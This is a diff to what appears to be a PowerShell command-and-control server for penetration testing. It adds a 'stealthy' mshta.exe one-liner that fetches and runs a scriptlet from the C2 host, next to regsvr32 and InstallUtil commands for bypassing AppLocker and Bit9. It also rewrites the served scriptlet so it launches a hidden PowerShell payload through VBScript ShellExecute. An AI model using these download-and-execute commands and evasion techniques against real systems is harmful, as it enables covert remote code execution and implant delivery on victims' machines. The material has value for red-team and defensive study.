@@ -934,8 +934,9 @@ else
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill Date $killdatefm"`n -ForegroundColor Green
     Write-Host "To quickly get setup for internal pentesting, run:"
     write-host $shortcut `n -ForegroundColor green
-    Write-Host "For a more stealthy approach internally, use SubTee's Regsvr32:"
+    Write-Host "For a more stealthy approach, use SubTee's Regsvr32 or Mshta:"
     write-host "regsvr32 /s /n /u /i:http://$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:http://$($ipv4address):$($serverport)/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U posh.exe" -ForegroundColor green
@@ -1063,6 +1064,8 @@ while ($listener.IsListening)
     }
     if ($request.Url -match "/$($downloaduri)_rg$") 
     {
+
+        $payloadparams = $payload -replace "powershell.exe ",""
         $message = '<?XML version="1.0"?>
 <scriptlet>
 
@@ -1072,25 +1075,29 @@ while ($listener.IsListening)
     version="1.00"
     classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
     >   
-    <script language="JScript">
+    <script language="VBScript">
         <![CDATA[
-        var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");
+            Sub Exec()
+            Dim objShell
+            set objShell = CreateObject("shell.application")
+            objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
+            End Sub
+            Exec()
         ]]>
     </script>
 </registration>
-
 <public>
     <method name="Exec"></method>
 </public>
-<script language="JScript">
-<![CDATA[
-    
-    function Exec()
-    {
-        var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");
-    }
-    
-]]>
+<script language="VBScript">
+    <![CDATA[
+        Sub Exec()
+        Dim objShell
+        set objShell = CreateObject("shell.application")
+        objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
+        End Sub
+        Exec()
+    ]]>
 </script>
 
 </scriptlet>'
